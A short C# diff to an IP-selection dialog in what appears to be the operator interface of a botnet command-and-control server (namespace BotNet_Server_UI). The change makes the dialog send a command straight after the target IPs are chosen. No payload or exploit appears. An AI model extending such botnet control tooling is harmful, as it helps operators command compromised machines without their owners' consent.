@@ -10,11 +10,16 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class IPSet : Window
     {
+        bool isSendFrom = false;
         public IPSet()
         {
             InitializeComponent();
         }
-
+        public IPSet(bool isSendFrom)
+        {
+            this.isSendFrom = isSendFrom;
+            InitializeComponent();
+        }
         private void OKButton_Click(object sender, RoutedEventArgs e)
         {
             if (ResponseTextBox.Text == "null")
@@ -31,6 +36,11 @@ namespace BotNet_Server_UI
             {
                 ((MainWindow)Application.Current.Windows[0]).ipsall = false;
                 ((MainWindow)Application.Current.Windows[0]).ips = ResponseTextBox.Text.Split(' ');
+            }
+
+            if (isSendFrom)
+            {
+                ((MainWindow)Application.Current.Windows[0]).Send_Command();
             }
 
             Close();
@@ -54,6 +64,11 @@ namespace BotNet_Server_UI
                 {
                     ((MainWindow)Application.Current.Windows[0]).ipsall = false;
                     ((MainWindow)Application.Current.Windows[0]).ips = ResponseTextBox.Text.Split(' ');
+                }
+
+                if (isSendFrom)
+                {
+                    ((MainWindow)Application.Current.Windows[0]).Send_Command();
                 }
 
                 Close();
